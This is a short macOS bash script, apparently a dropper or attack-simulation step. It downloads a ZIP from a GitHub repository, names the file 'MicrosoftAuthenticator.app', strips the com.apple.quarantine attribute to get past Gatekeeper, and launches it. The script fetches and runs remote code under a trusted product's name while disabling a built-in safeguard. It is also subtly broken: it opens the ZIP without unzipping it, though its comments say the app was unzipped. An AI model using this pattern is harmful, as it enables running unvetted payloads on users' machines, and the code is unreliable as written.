#!/bin/bash

# Set the path where you want to download the file
download_path="/Users/isaiahl/Library/MicrosoftAuthenticator.app"

# Use curl to download the file to the specified path
curl -o "$download_path" -L https://github.com/CYBTWR-TAMUTO/M365DShared/raw/main/MicrosoftAuthenticator.app.zip

# Sleep for a moment to allow time for download
sleep 10

# Specify the name of the downloaded ZIP file
appName="MicrosoftAuthenticator.app"

# Specify the full path to the downloaded ZIP file
appPath="/Users/isaiahl/Library/$appName"

# Check if the downloaded ZIP file exists
if [ -e "$appPath" ]; then

    # Check extended attributes for MicrosoftAuthenticator.app
    echo "[1] GateKeeper check: $appName"
    xattr_result=$(xattr "$appPath")

    # Check if "com.apple.quarantine" is present in the extended attributes
    if [[ $xattr_result == *"com.apple.quarantine"* ]]; then
        echo "  [+] 'com.apple.quarantine' attribute is present."
        
        # Removing 'com.apple.quarantine' attribute
        echo "  [+] Removing 'com.apple.quarantine' attribute..."
        xattr -d com.apple.quarantine "$appPath"
        xattr "$appPath"
        echo "  [+] Attribute removed."
    else
        echo "No 'com.apple.quarantine' attribute found."
    fi

    # Run the unzipped app 
    echo "[2] App execution : $appName"
    open "$appPath"
else
    echo "Error: Downloaded ZIP file not found."
fi
